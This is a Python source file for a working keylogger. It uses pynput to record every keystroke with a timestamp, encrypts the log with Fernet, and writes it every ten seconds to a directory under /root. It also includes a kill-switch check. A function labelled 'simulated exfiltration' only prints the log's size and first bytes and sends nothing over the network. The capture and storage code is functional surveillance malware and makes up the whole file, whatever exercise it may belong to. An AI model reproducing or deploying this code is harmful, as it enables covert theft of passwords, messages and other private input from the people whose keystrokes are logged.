import os
import threading
from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime

LOG_DIR = os.path.expanduser("/root/keylogger_logs")
KEY_FILE = os.path.join(LOG_DIR, "secret.key")
LOG_FILE = os.path.join(LOG_DIR, "encrypted_log.txt")
KILL_FILE = os.path.join(LOG_DIR, "kill.txt")

os.makedirs(LOG_DIR, exist_ok=True)
log = ""

def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)

def load_key():
    return open(KEY_FILE, "rb").read()

def encrypt_data(data):
    key = load_key()
    f = Fernet(key)
    return f.encrypt(data.encode())

def save_encrypted_log(encrypted_log):
    with open(LOG_FILE, "ab") as f:
        f.write(encrypted_log + b"\n")

def on_press(key):
    global log
    try:
        log += f"{datetime.now()} - {key.char}\n"
    except AttributeError:
        log += f"{datetime.now()} - {key}\n"

def flush_log():
    global log
    if log:
        encrypted = encrypt_data(log)
        save_encrypted_log(encrypted)
        log = ""
    threading.Timer(10, flush_log).start()

def check_kill_switch():
    if os.path.exists(KILL_FILE):
        print("[*] Kill switch activated.")
        os._exit(0)
    threading.Timer(5, check_kill_switch).start()

def simulate_exfiltration():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "rb") as f:
            data = f.read()
            print(f"[Simulated Exfiltration] Sending {len(data)} bytes...")
            print(data[:100], b"...")

if __name__ == "__main__":
    if not os.path.exists(KEY_FILE):
        generate_key()

    check_kill_switch()
    flush_log()
    simulate_exfiltration()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
